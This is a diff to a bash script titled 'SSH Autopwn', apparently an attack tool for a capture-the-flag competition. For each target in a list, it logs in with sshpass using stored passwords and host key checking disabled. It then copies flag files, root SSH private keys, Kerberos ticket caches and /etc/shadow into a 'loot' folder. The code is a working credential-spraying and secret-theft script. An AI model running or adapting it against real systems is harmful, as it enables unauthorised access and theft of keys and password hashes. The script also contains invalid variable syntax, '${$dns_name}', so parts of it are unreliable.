@@ -1,5 +1,7 @@
 #!/bin/bash
 
+# SSH Autopwn
+
 # Ensure sshpass is installed
 if ! command -v sshpass &> /dev/null; then
     echo "sshpass not found. Please install it first."
@@ -9,6 +11,7 @@ fi
 # Set paths
 TARGETS_FILE="ssh-targets.txt"
 FLAGS_DIR="flags"
+LOOT_DIR="loot"
 CREDENTIALS_FILE="ssh-credentials.txt"
 
 # Read each line from the target file
@@ -46,19 +49,19 @@ while IFS=',' read -r team_info ip_info; do
             
             # Attempt to download any .flag files from the /etc/ directory
             echo "Downloading .flag files from $dns_name"
-            sshpass -p "$password" scp -o StrictHostKeyChecking=no -P "$port" "${username}@${ip_address}:/etc/*.flag" "${FLAGS_DIR}/team${team_number}/${$dns_name}"
+            sshpass -p "$password" scp -o StrictHostKeyChecking=no -P "$port" "${username}@${ip_address}:/etc/*.flag" "${LOOT_DIR}/team${team_number}/${$dns_name}"
 
             # Try and download root ssh keys
             echo "Downloading any SSH keys"
-            sshpass -p "$password" scp -o StrictHostKeyChecking=no -P "$port" "${username}@${ip_address}:/root/.ssh/*" "${FLAGS_DIR}/team${team_number}/${$dns_name}"
+            sshpass -p "$password" scp -o StrictHostKeyChecking=no -P "$port" "${username}@${ip_address}:/root/.ssh/*" "${LOOT_DIR}/team${team_number}/${$dns_name}"
 
             # Try and download kerb keys
             echo "Downloading any kerb keys"
-            sshpass -p "$password" scp -o StrictHostKeyChecking=no -P "$port" "${username}@${ip_address}:/tmp/krb5cc*" "${FLAGS_DIR}/team${team_number}/${$dns_name}"
+            sshpass -p "$password" scp -o StrictHostKeyChecking=no -P "$port" "${username}@${ip_address}:/tmp/krb5cc*" "${LOOT_DIR}/team${team_number}/${$dns_name}"
 
             # Try and download shadown
             echo "Downloading shadow"
-            sshpass -p "$password" scp -o StrictHostKeyChecking=no -P "$port" "${username}@${ip_address}:/etc/shadow*" "${FLAGS_DIR}/team${team_number}/${$dns_name}"
+            sshpass -p "$password" scp -o StrictHostKeyChecking=no -P "$port" "${username}@${ip_address}:/etc/shadow*" "${LOOT_DIR}/team${team_number}/${$dns_name}"
 
             if [[ $? -eq 0 ]]; then
                 echo "FOUND FLAGS: Successfully downloaded .flag files from $dns_name using $username"
